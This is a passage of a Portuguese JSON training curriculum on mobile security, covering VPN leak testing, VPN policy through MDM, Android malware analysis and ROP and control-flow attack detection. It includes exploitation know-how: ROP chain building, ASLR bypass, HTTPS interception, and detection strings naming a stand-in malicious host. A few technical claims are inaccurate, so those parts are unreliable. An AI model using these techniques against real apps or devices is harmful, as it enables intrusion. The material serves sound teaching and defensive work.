                                    "Ative VPN e repita testes de IP/DNS/IPv6 em ipleak.net.",
                                    "Mude para dados móveis (4G/5G), ative VPN e execute os mesmos testes.",
                                    "Simule tráfego: acesse sites sensíveis (banco simulado) e verifique logs.",
                                    "Compare desempenho e leaks entre redes."
                                  ],
                                  "verification": "Proteção consistente em todas as redes, sem vazamentos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Wi-Fi público ou hotspot",
                                    "Plano de dados móveis",
                                    "ipleak.net"
                                  ],
                                  "tips": "Use VPN com obfuscation em redes restritivas para simular cenários reais.",
                                  "learningObjective": "Validar eficácia da VPN em redes não confiáveis comuns.",
                                  "commonMistakes": "Não alternar redes corretamente ou ignorar latência que mascara leaks."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar resultados e documentar",
                                  "subSteps": [
                                    "Compile todos os screenshots e logs em um relatório.",
                                    "Identifique falhas: liste leaks encontrados e causas potenciais.",
                                    "Avalie eficácia geral (nota 1-10) e recomende melhorias.",
                                    "Teste uma segunda VPN para comparação.",
                                    "Salve relatório em PDF para portfolio."
                                  ],
                                  "verification": "Relatório completo com evidências e conclusões acionáveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta de edição (Word/Google Docs)",
                                    "Segunda VPN para benchmark"
                                  ],
                                  "tips": "Use tabelas para comparar testes before/after.",
                                  "learningObjective": "Sintetizar dados de testes em insights práticos sobre segurança VPN.",
                                  "commonMistakes": "Subjetividade na análise sem evidências ou ignorar benchmarks."
                                }
                              ],
                              "practicalExample": "Em um café com Wi-Fi público, conecte à VPN no celular, acesse ipleak.net via dados móveis simulados, verifique zero leaks de DNS/IPv6, teste kill switch desconectando Wi-Fi e confirmando bloqueio de apps como WhatsApp até reconexão.",
                              "finalVerifications": [
                                "IP e DNS exibem apenas servidores VPN em todos os testes.",
                                "Nenhum leak de IPv6 detectado em ferramentas especializadas.",
                                "Kill switch bloqueia todo tráfego durante desconexões.",
                                "Proteção consistente em Wi-Fi público e dados móveis.",
                                "Relatório documenta evidências sem ambiguidades.",
                                "VPN recomendada passa em 100% dos critérios."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de leaks (zero falsos negativos).",
                                "Completude do relatório com screenshots e análises.",
                                "Cobertura de todos os cenários: IP/DNS/IPv6/kill switch/redes.",
                                "Tempo de execução dentro do estimado total (2 horas).",
                                "Identificação de limitações da VPN testada.",
                                "Propostas de mitigação para falhas encontradas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender protocolos IP/DNS/IPv6.",
                                "Desenvolvimento de Software: Automatizar testes com scripts Python/Selenium.",
                                "Ética e Privacidade: Implicações legais de vazamentos de dados.",
                                "Análise de Dados: Interpretar logs e métricas de segurança."
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança em empresas remotas testam VPNs para proteger acessos corporativos em viagens, evitando roubo de dados em aeroportos ou hotéis via Wi-Fi público."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.4.3",
                            "name": "Gerenciar políticas de VPN em dispositivos",
                            "description": "Definir split tunneling, always-on VPN e integração com MDM (Mobile Device Management) para políticas empresariais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejar Políticas de VPN para Dispositivos Móveis",
                                  "subSteps": [
                                    "Analisar requisitos empresariais: identificar tráfego que deve passar pela VPN (ex.: apps corporativos) vs. tráfego local (split tunneling).",
                                    "Definir cenários de uso: always-on para acesso contínuo ou on-demand.",
                                    "Mapear integração com MDM: escolher provedor (ex.: Microsoft Intune, VMware Workspace ONE) e políticas de conformidade.",
                                    "Documentar políticas: criar diagrama de fluxo de tráfego e regras de enforcement.",
                                    "Avaliar compatibilidade: verificar suporte em iOS/Android e versões de dispositivos."
                                  ],
                                  "verification": "Documento de planejamento aprovado com diagrama e requisitos mapeados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação MDM oficial, diagramação tool (ex.: Draw.io), requisitos empresariais simulados.",
                                  "tips": "Priorize tráfego sensível para VPN para minimizar latência.",
                                  "learningObjective": "Compreender os componentes chave de políticas VPN móveis.",
                                  "commonMistakes": "Ignorar diferenças entre iOS e Android no suporte a always-on."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Split Tunneling",
                                  "subSteps": [
                                    "Acessar console MDM e criar perfil VPN com split tunneling ativado.",
                                    "Definir rotas exclusivas: especificar domínios/IPs corporativos (ex.: *.empresa.com, 10.0.0.0/8).",
                                    "Configurar exclusões: listar apps ou tráfego local (ex.: streaming, atualizações).",
                                    "Aplicar políticas de roteamento: usar DNS split ou roteamento baseado em app.",
                                    "Salvar e validar configuração no perfil."
                                  ],
                                  "verification": "Simular tráfego: tráfego corporativo roteia via VPN, local não.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Console MDM (ex.: Intune), lab virtual com dispositivos simulados (ex.: Android Emulator).",
                                  "tips": "Use wildcards (*) para domínios para simplicidade.",
                                  "learningObjective": "Implementar roteamento seletivo para otimizar performance.",
                                  "commonMistakes": "Configurar full tunnel por engano, causando lentidão em todo tráfego."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Always-On VPN",
                                  "subSteps": [
                                    "Ativar always-on no perfil VPN: configurar lock down para impedir desconexão.",
                                    "Definir reconexão automática: intervalo de retry e autenticação (certificados ou EAP).",
                                    "Configurar bloqueio de tráfego não-VPN: ativar firewall rules no MDM.",
                                    "Testar em modo locked: simular perda de sinal e verificar reconexão.",
                                    "Integrar kill switch: bloquear internet sem VPN ativa."
                                  ],
                                  "verification": "Desconectar rede: VPN reconecta em <10s sem vazamento de tráfego.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Dispositivos físicos ou emuladores iOS/Android, Wireshark para captura de pacotes.",
                                  "tips": "Use certificados para autenticação sem prompts de senha.",
                                  "learningObjective": "Garantir conectividade VPN persistente para segurança contínua.",
                                  "commonMistakes": "Não testar kill switch, permitindo vazamentos em falhas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Políticas VPN com MDM",
                                  "subSteps": [
                                    "Criar grupo de dispositivos no MDM e atribuir perfil VPN.",
                                    "Configurar enforcement: políticas condicionais baseadas em compliance (ex.: jailbreak detectado).",
                                    "Definir distribuição: push silencioso para dispositivos enrolled.",
                                    "Monitorar conformidade: ativar logs e alertas para falhas de VPN.",
                                    "Atualizar políticas: criar versão para teste antes de produção."
                                  ],
                                  "verification": "Dispositivos recebem perfil e aplicam políticas sem intervenção manual.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Portal MDM admin, dispositivos enrolled em MDM.",
                                  "tips": "Use grupos dinâmicos para escalabilidade.",
                                  "learningObjective": "Automatizar gerenciamento centralizado de VPN via MDM.",
                                  "commonMistakes": "Atribuir perfil a todos os dispositivos sem segmentação."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar Políticas Completas",
                                  "subSteps": [
                                    "Executar testes end-to-end: split, always-on e MDM enforcement em cenários reais.",
                                    "Verificar logs: analisar conectividade, vazamentos e erros.",
                                    "Simular falhas: perda de sinal, app launches, rotação de rede.",
                                    "Coletar métricas: latência, bateria impact, uptime VPN.",
                                    "Documentar resultados e ajustes necessários."
                                  ],
                                  "verification": "Relatório de testes com 100% pass em verificações chave.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Ferramentas de teste (Wireshark, MDM reports), checklists de validação.",
                                  "tips": "Automatize testes com scripts se possível.",
                                  "learningObjective": "Validar robustez das políticas em produção simulada.",
                                  "commonMistakes": "Testar apenas em Wi-Fi estável, ignorando 4G/5G."
                                }
                              ],
                              "practicalExample": "Em uma empresa de finanças, configure split tunneling para rotear apenas acessos ao ERP e e-mails via VPN (evitando lentidão em vídeos YouTube), always-on para proteger dados em trânsito em dispositivos de vendedores remotos, e integre com Intune para bloquear VPN em dispositivos não-compliant, garantindo conformidade GDPR.",
                              "finalVerifications": [
                                "Split tunneling roteia corretamente tráfego corporativo vs. local sem vazamentos.",
                                "Always-on VPN mantém conexão persistente com reconexão automática <10s.",
                                "MDM distribui e enforces políticas em dispositivos enrolled.",
                                "Kill switch previne tráfego não-VPN em falhas.",
                                "Logs mostram zero violações em testes de 30min.",
                                "Performance: latência <200ms para apps corporativos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de split tunneling (80% tráfego correto).",
                                "Robustez do always-on (uptime >99% em testes).",
                                "Integração MDM seamless sem erros de deploy.",
                                "Documentação completa com diagramas e resultados.",
                                "Identificação e correção de pelo menos 2 erros comuns.",
                                "Eficiência: conclusão dentro do tempo estimado total."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Conceitos de roteamento e tunneling (IPsec, IKEv2).",
                                "Administração de Sistemas: Gerenciamento centralizado via MDM.",
                                "Segurança de Dados: Proteção em trânsito e conformidade regulatória.",
                                "Desenvolvimento Móvel: Políticas per-app VPN."
                              ],
                              "realWorldApplication": "Administradores de TI em empresas remotas usam isso para proteger acessos sensíveis em smartphones de funcionários, prevenindo breaches em redes públicas e garantindo produtividade sem comprometer segurança."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.7.5",
                    "name": "Detecção de Malware e Atualizações em Dispositivos Móveis",
                    "description": "Técnicas de análise de apps, detecção de ameaças e gerenciamento de patches de segurança.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.5.1",
                        "name": "Análise de Aplicativos Móveis",
                        "description": "Técnicas de análise estática e dinâmica para identificar vulnerabilidades e comportamentos maliciosos em apps móveis, incluindo exame de binários e semântica de execução.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.5.1.1",
                            "name": "Realizar Análise Estática de Binários de Apps",
                            "description": "Examinar o código binário de aplicativos móveis sem execução, identificando strings suspeitas, permissões excessivas e chamadas de API perigosas usando ferramentas como APKTool ou Jadx.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Análise e Obter o APK",
                                  "subSteps": [
                                    "Instale ferramentas necessárias: APKTool, Jadx e um editor de texto como VS Code.",
                                    "Baixe um APK de exemplo de uma fonte confiável ou conhecida (ex: APK malicioso para teste).",
                                    "Configure um ambiente isolado, como uma VM Linux, para evitar riscos.",
                                    "Verifique a integridade do APK com hash SHA256.",
                                    "Crie uma pasta dedicada para a análise."
                                  ],
                                  "verification": "Ambiente pronto se APKTool e Jadx executarem sem erros e APK estiver na pasta.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Linux VM (Ubuntu), APKTool, Jadx-GUI, APK de teste, terminal.",
                                  "tips": "Use Docker para isolar ferramentas e evitar contaminação.",
                                  "learningObjective": "Preparar um ambiente seguro para análise estática sem riscos à máquina host.",
                                  "commonMistakes": "Executar APK diretamente sem análise estática; ignorar verificação de hash."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descompilar o APK com APKTool e Jadx",
                                  "subSteps": [
                                    "Execute 'apktool d nome.apk' para extrair recursos e smali.",
                                    "Abra o APK no Jadx-GUI para visualização de código Java/Kotlin.",
                                    "Navegue pela estrutura: AndroidManifest.xml, res/, smali/.",
                                    "Extraia strings.xml e identifique chaves suspeitas.",
                                    "Salve dumps de código para análise posterior."
                                  ],
                                  "verification": "Arquivos descompilados gerados sem erros; código fonte visível no Jadx.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "APKTool, Jadx-GUI, APK de teste.",
                                  "tips": "Use Jadx para código legível; APKTool para recursos binários.",
                                  "learningObjective": "Dominar descompilação para acessar componentes internos do APK.",
                                  "commonMistakes": "Ignorar erros de descompilação causados por ofuscação; não salvar dumps."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Permissões e AndroidManifest.xml",
                                  "subSteps": [
                                    "Abra AndroidManifest.xml e liste todas as permissões declaradas.",
                                    "Identifique permissões perigosas: SEND_SMS, READ_CONTACTS, ACCESS_FINE_LOCATION.",
                                    "Verifique receivers, services e activities não declarados.",
                                    "Compare permissões com funcionalidades aparentes do app.",
                                    "Anote discrepâncias em um relatório inicial."
                                  ],
                                  "verification": "Lista completa de permissões com flags de risco anotadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Editor de texto, AndroidManifest.xml descompilado.",
                                  "tips": "Use grep para filtrar 'uses-permission' rapidamente.",
                                  "learningObjective": "Detectar permissões excessivas indicativas de malware.",
                                  "commonMistakes": "Confundir permissões normais com suspeitas sem contexto."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Examinar Strings Suspeitas e Chamadas de API",
                                  "subSteps": [
                                    "Pesquise strings como 'root', 'su', 'http://malicious.com', 'keylog' nos arquivos.",
                                    "No Jadx, busque chamadas a APIs suspeitas: Runtime.exec(), URLConnection.",
                                    "Analise fluxos de rede: sockets, HTTP requests para C2 servers.",
                                    "Verifique criptografia fraca ou hard-coded secrets.",
                                    "Documente evidências com screenshots e caminhos de código."
                                  ],
                                  "verification": "Relatório com pelo menos 5 strings/APIs suspeitas identificadas e contextualizadas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Jadx-GUI, grep/regex no terminal, editor de texto.",
                                  "tips": "Use busca global no Jadx; combine com strings command-line.",
                                  "learningObjective": "Identificar indicadores de comportamento malicioso no código.",
                                  "commonMistakes": "Focar só em strings óbvias; ignorar ofuscação base64."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Compilar Relatório e Verificar Achados",
                                  "subSteps": [
                                    "Resuma permissões excessivas, strings e APIs perigosas.",
                                    "Classifique riscos: baixo/médio/alto com justificativa.",
                                    "Compare com VirusTotal ou relatórios conhecidos.",
                                    "Sugira mitigações: bloquear app, atualizar políticas.",
                                    "Limpe ambiente de análise."
                                  ],
                                  "verification": "Relatório completo gerado e ambiente limpo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Template de relatório (Markdown/Word), VirusTotal.",
                                  "tips": "Use templates padronizados para relatórios consistentes.",
                                  "learningObjective": "Sintetizar análise em relatório acionável.",
                                  "commonMistakes": "Omitir evidências; não validar com fontes externas."
                                }
                              ],
                              "practicalExample": "Analise o APK 'FakeBank.apk': descompile e identifique permissão SEND_SMS excessiva, string 'premiumsms' e chamada Runtime.exec('su') para root, indicando trojan bancário.",
                              "finalVerifications": [
                                "Permissões excessivas listadas com justificativa.",
                                "Pelo menos 3 strings suspeitas extraídas e analisadas.",
                                "Chamadas de API perigosas mapeadas no código.",
                                "Relatório com screenshots de evidências.",
                                "Ambiente de análise limpo e seguro.",
                                "Validação cruzada com ferramenta externa como VirusTotal."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de permissões suspeitas (90%+).",
                                "Profundidade na análise de strings e APIs (cobertura completa).",
                                "Qualidade do relatório: claro, evidenciado e acionável.",
                                "Tempo de execução dentro do estimado.",
                                "Adesão a práticas de segurança (isolamento).",
                                "Correção de erros comuns identificados."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Entendimento de Java/Kotlin e análise de bytecode.",
                                "Sistemas Operacionais: Arquitetura Android e permissões.",
                                "Ética e Direito: Implicações legais de reverse engineering.",
                                "Redes: Detecção de comunicações C2 em apps.",
                                "Matemática: Uso de hashes e regex para padrões."
                              ],
                              "realWorldApplication": "Auditar apps corporativos para vazamentos de dados, detectar malware em lojas alternativas como APKPure, ou investigar incidentes de segurança móvel em equipes de resposta a incidentes (SOC)."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.1.2",
                            "name": "Aplicar Análise Dinâmica de Apps",
                            "description": "Executar apps em ambientes controlados para observar comportamento em tempo real, detectando acessos não autorizados a recursos como câmera, microfone ou localização.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Análise Dinâmica",
                                  "subSteps": [
                                    "Instalar um emulador Android como Android Studio Emulator ou Genymotion.",
                                    "Habilitar root no emulador para instalação de ferramentas avançadas.",
                                    "Instalar ferramentas de monitoramento: ADB, Frida, Objection e um proxy como Burp Suite ou Mitmproxy.",
                                    "Configurar certificado SSL no emulador para interceptar tráfego HTTPS.",
                                    "Verificar isolamento do ambiente criando uma conta de usuário restrita no emulador."
                                  ],
                                  "verification": "Executar 'adb devices' para confirmar conexão e listar processos com Frida para validar root.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Computador com 8GB RAM mínimo",
                                    "Android Studio",
                                    "Frida toolkit",
                                    "Burp Suite Community Edition"
                                  ],
                                  "tips": "Sempre use emulador isolado para evitar riscos em dispositivos reais; snapshot o estado inicial.",
                                  "learningObjective": "Preparar um ambiente controlado e seguro para execução de apps móveis.",
                                  "commonMistakes": [
                                    "Esquecer de rootear o emulador",
                                    "Não configurar proxy SSL",
                                    "Usar dispositivo pessoal sem isolamento"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar e Instalar o App Alvo",
                                  "subSteps": [
                                    "Obter o APK do app suspeito de fontes confiáveis ou extraídas.",
                                    "Verificar assinatura e integridade do APK com ferramentas como 'apksigner' ou 'jarsigner'.",
                                    "Instalar o APK no emulador via 'adb install'.",
                                    "Configurar hooks iniciais com Frida para monitorar chamadas de API desde a instalação.",
                                    "Listar permissões declaradas no manifesto com 'aapt dump badging'."
                                  ],
                                  "verification": "App instalado e listado em 'adb shell pm list packages'; permissões visualizadas corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "APK do app alvo",
                                    "ADB tools",
                                    "Frida server no emulador"
                                  ],
                                  "tips": "Renomeie o APK para evitar detecção por nomes originais; use modo avião inicialmente.",
                                  "learningObjective": "Preparar o app para análise sem alterar seu comportamento inicial.",
                                  "commonMistakes": [
                                    "Instalar APK modificado acidentalmente",
                                    "Ignorar verificação de assinatura",
                                    "Não listar permissões antes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar e Monitorar o Comportamento do App",
                                  "subSteps": [
                                    "Iniciar o app no emulador e ativar todos os monitors simultaneamente (Frida para APIs, proxy para rede).",
                                    "Simular interações reais: abrir app, conceder permissões seletivas, usar funcionalidades.",
                                    "Capturar logs em tempo real: acessos a câmera (Camera API), microfone (AudioRecord), localização (LocationManager).",
                                    "Monitorar tráfego de rede para envios não autorizados de dados.",
                                    "Registrar timestamps de eventos suspeitos."
                                  ],
                                  "verification": "Logs gerados com entradas de APIs sensíveis; tráfego capturado no proxy.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Emulador rodando",
                                    "Scripts Frida personalizados",
                                    "Proxy configurado"
                                  ],
                                  "tips": "Use Frida scripts prontos para hooks comuns como camera_open(); grave tela para evidências visuais.",
                                  "learningObjective": "Observar e registrar comportamentos do app em execução real-time.",
                                  "commonMistakes": [
                                    "Conceder todas permissões de uma vez",
                                    "Não simular uso real",
                                    "Perder logs por buffer overflow"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Dados e Detectar Acessos Não Autorizados",
                                  "subSteps": [
                                    "Revisar logs Frida para chamadas indevidas (ex: localização sem permissão ativa).",
                                    "Analisar pacotes de rede no proxy para dados sensíveis enviados.",
                                    "Comparar acessos observados com permissões declaradas no manifesto.",
                                    "Identificar padrões maliciosos como acessos em background ou leaks de dados.",
                                    "Classificar ameaças: baixo, médio, alto risco."
                                  ],
                                  "verification": "Relatório preliminar com lista de anomalias detectadas e evidências.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Logs capturados",
                                    "Ferramentas como Wireshark para rede",
                                    "Editor de texto/hex"
                                  ],
                                  "tips": "Filtre logs por pacotes sensíveis (android.hardware.camera); corrique anomalias com documentação oficial Android.",
                                  "learningObjective": "Interpretar dados de monitoramento para identificar violações de segurança.",
                                  "commonMistakes": [
                                    "Confundir acessos legítimos com maliciosos",
                                    "Ignorar contexto de uso",
                                    "Não priorizar riscos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar Achados e Limpar o Ambiente",
                                  "subSteps": [
                                    "Compilar relatório com screenshots, logs e classificações de ameaças.",
                                    "Recomendar ações: bloquear app, reportar à store, mitigações.",
                                    "Desinstalar app e restaurar snapshot do emulador.",
                                    "Verificar resquícios com scans (ex: rootkit hunters para Android).",
                                    "Arquivar evidências de forma segura."
                                  ],
                                  "verification": "Relatório completo gerado; emulador limpo e pronto para novo uso.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Template de relatório",
                                    "Ferramentas de backup/snapshot"
                                  ],
                                  "tips": "Use Markdown ou ferramentas como Dradis para relatórios padronizados; sempre backup logs.",
                                  "learningObjective": "Finalizar análise com documentação profissional e limpeza segura.",
                                  "commonMistakes": [
                                    "Relatório vago sem evidências",
                                    "Não limpar ambiente completamente",
                                    "Expor dados sensíveis"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise um app de 'lanterna' gratuito que solicita permissões para câmera, microfone e localização. Ao executá-lo, observe via Frida que ele acessa o microfone em background para gravação não declarada, enviando áudio para um servidor remoto via proxy logs.",
                              "finalVerifications": [
                                "Ambiente configurado e isolado corretamente.",
                                "App executado com todos monitores ativos.",
                                "Todos acessos não autorizados listados com evidências (logs/screenshots).",
                                "Relatório completo com classificações de risco.",
                                "Ambiente limpo sem resquícios.",
                                "Reproduzibilidade da análise confirmada."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de acessos indevidos (90%+ acurácia).",
                                "Qualidade dos logs e análise interpretativa.",
                                "Uso correto de ferramentas sem erros de configuração.",
                                "Relatório claro, conciso e acionável.",
                                "Tempo respeitado e eficiência nos steps.",
                                "Identificação de pelo menos 3 potenciais ameaças."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Análise de tráfego e protocolos móveis.",
                                "Programação: Desenvolvimento de scripts Frida em JavaScript.",
                                "Análise de Dados: Processamento e visualização de logs.",
                                "Ética em TI: Privacidade de dados e relatórios de vulnerabilidades.",
                                "Sistemas Operacionais: Compreensão de Android internals."
                              ],
                              "realWorldApplication": "Em equipes de segurança como Google Play Protect ou empresas de pentest móvel, para revisar apps antes da publicação, detectar spywares em dispositivos corporativos ou apoiar investigações forenses em incidentes de vazamento de dados."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.1.3",
                            "name": "Identificar Ataques de Controle de Fluxo",
                            "description": "Detectar vulnerabilidades como ROP (Return-Oriented Programming) e injeções de código em apps móveis através de análise de integridade do controle de fluxo e proteções como ASLR e canários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Controle de Fluxo",
                                  "subSteps": [
                                    "Estude o fluxo de execução normal em aplicativos móveis (Android/iOS), focando em pilha de chamadas e ponteiros de retorno.",
                                    "Analise diagramas de pilha de execução e como o controle de fluxo é mantido via registradores e frames de pilha.",
                                    "Revise conceitos de buffer overflow e como eles violam o controle de fluxo.",
                                    "Explore exemplos de código fonte em C/Java que demonstram fluxo de controle simples.",
                                    "Pratique desenhando fluxogramas de execução para funções vulneráveis."
                                  ],
                                  "verification": "Desenhe e explique um fluxograma de pilha para uma função com buffer overflow, identificando o ponto de violação.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documentação Android NDK sobre pilha",
                                    "Ferramenta Draw.io para diagramas",
                                    "Exemplos de código em GitHub (buffer overflow demos)"
                                  ],
                                  "tips": [
                                    "Use visualizações interativas como as do site 'exploit-exercises.com'",
                                    "Compare fluxo normal vs. corrompido lado a lado"
                                  ],
                                  "learningObjective": "Entender como o controle de fluxo é implementado e violado em apps móveis.",
                                  "commonMistakes": [
                                    "Confundir pilha com heap",
                                    "Ignorar registradores como PC (Program Counter)",
                                    "Não considerar arquitetura ARM em mobiles"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Proteções de Controle de Fluxo",
                                  "subSteps": [
                                    "Aprenda sobre Stack Canaries: como são gerados, inseridos e verificados em funções.",
                                    "Estude ASLR (Address Space Layout Randomization) e suas variantes PIE/PAX em Android.",
                                    "Analise DEP/NX (Data Execution Prevention) e W^X policies em mobiles.",
                                    "Examine CFI (Control Flow Integrity) em frameworks como Android's SELinux.",
                                    "Teste bypasses teóricos dessas proteções em ambientes simulados."
                                  ],
                                  "verification": "Liste e descreva 3 proteções com exemplos de como detectá-las em binários (e.g., strings 'canary' ou flags PIE).",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação oficial Android Security Bulletin",
                                    "Ferramenta checksec.sh adaptada para ARM",
                                    "Livro 'Hacking: The Art of Exploitation' capítulos relevantes"
                                  ],
                                  "tips": [
                                    "Use 'readelf' ou 'objdump' em binários ELF para inspecionar headers",
                                    "Habilite verbose logging em emuladores para ver ASLR em ação"
                                  ],
                                  "learningObjective": "Identificar e avaliar eficácia de proteções como ASLR e canários em apps móveis.",
                                  "commonMistakes": [
                                    "Assumir ASLR total sem partial relro",
                                    "Confundir canários com outros checks",
                                    "Ignorar ASLR leaks via info disclosure"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Ataques Específicos: ROP e Injeções",
                                  "subSteps": [
                                    "Estude ROP: gadgets, chains e uso de ROPgadget para encontrar em binários.",
                                    "Analise injeções de código em mobiles: shellcode via intents ou WebView exploits.",
                                    "Compare ROP clássico vs. mobile (considerando ARM gadgets e thumb mode).",
                                    "Revise exemplos de CVEs reais em apps móveis (e.g., Stagefright ROP).",
                                    "Simule um ataque ROP em um binário vulnerável usando pwntools."
                                  ],
                                  "verification": "Explique um chain ROP simples para um binário ARM e identifique gadgets necessários.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Ferramenta ROPgadget",
                                    "Pwntools para Python scripting",
                                    "CVE database (e.g., Stagefright CVE-2015-1538)"
                                  ],
                                  "tips": [
                                    "Filtre gadgets por arquitetura ARM com 'ROPgadget --binary app.so --arch arm'",
                                    "Use QEMU para emular ARM sem device físico"
                                  ],
                                  "learningObjective": "Reconhecer padrões de ROP chains e injeções em código assembly móvel.",
                                  "commonMistakes": [
                                    "Buscar gadgets x86 em ARM",
                                    "Ignorar null bytes em shellcode móvel",
                                    "Não considerar ROP mitigações como RELRO"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Análise de Integridade em Apps Móveis",
                                  "subSteps": [
                                    "Descompile um APK com Jadx ou APKTool e inspecione native libs (.so).",
                                    "Use Frida/Objection para hooking dinâmico e monitorar controle de fluxo runtime.",
                                    "Analise logs de crashes para detectar canário failures ou ASLR bypasses.",
                                    "Integre ferramentas como Ghidra para análise estática de binários ARM.",
                                    "Documente vulnerabilidades encontradas em um relatório estruturado."
                                  ],
                                  "verification": "Produza um relatório de análise para um APK sample identificando pelo menos uma vulnerabilidade de fluxo.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Jadx-GUI",
                                    "Frida tools",
                                    "APK samples vulneráveis do GitHub (e.g., InsecureBankv2)",
                                    "Ghidra com ARM support"
                                  ],
                                  "tips": [
                                    "Hook funções como 'setjmp' ou '__stack_chk_fail' com Frida",
                                    "Combine estática (Ghidra) com dinâmica (Frida) para confirmação"
                                  ],
                                  "learningObjective": "Executar análise prática para detectar violações de controle de fluxo em apps reais.",
                                  "commonMistakes": [
                                    "Analisar apenas Java, ignorar JNI/natives",
                                    "Não rootar emulador para hooking full",
                                    "Confundir false positives de obfuscation"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Mitigar Descobertas",
                                  "subSteps": [
                                    "Valide detecções com testes de exploit (em ambiente isolado).",
                                    "Recomende mitigações: FORTIFY_SOURCE, full RELRO, CFI enable.",
                                    "Compare com scanners automáticos como MobSF para validação.",
                                    "Crie um checklist personalizado para análises futuras.",
                                    "Discuta cenários de bypass avançados (e.g., JIT ROP)."
                                  ],
                                  "verification": "Desenvolva e execute um teste de exploit bem-sucedido em um sample controlado.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "MobSF framework",
                                    "Genymotion emulator com root",
                                    "Checklist templates de OWASP Mobile"
                                  ],
                                  "tips": [
                                    "Use 'adb logcat' para capturar stack traces",
                                    "Automatize com scripts Frida para repetibilidade"
                                  ],
                                  "learningObjective": "Confirmar vulnerabilidades e propor soluções práticas.",
                                  "commonMistakes": [
                                    "Executar exploits em prod devices",
                                    "Ignorar mitigações existentes",
                                    "Não documentar evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe o APK vulnerável 'InsecureBankv2'. Use Jadx para descompilar libnative.so, identifique ausência de canário em strcpy(). Hook com Frida para monitorar pilha, injete payload ROP via intent malicioso, detecte bypass ASLR via leak de libc base e confirme chain com ROPgadget.",
                              "finalVerifications": [
                                "Explicar ROP chain em assembly ARM para um dado binário.",
                                "Detectar e descrever bypass de canário em código fonte.",
                                "Identificar ASLR status em um APK via análise estática.",
                                "Simular injeção de código em WebView móvel.",
                                "Produzir relatório com evidências de vulnerabilidade.",
                                "Comparar análise manual vs. MobSF output."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets ROP (90%+ match com ferramentas).",
                                "Compreensão demonstrada de proteções (explicação correta de 4+ mitigações).",
                                "Relatório completo com screenshots/logs de análise.",
                                "Tempo de detecção em sample < 30min após prática.",
                                "Propostas de mitigação viáveis e referenciadas.",
                                "Ausência de falsos positivos em verificações."
                              ],
                              "crossCurricularConnections": [
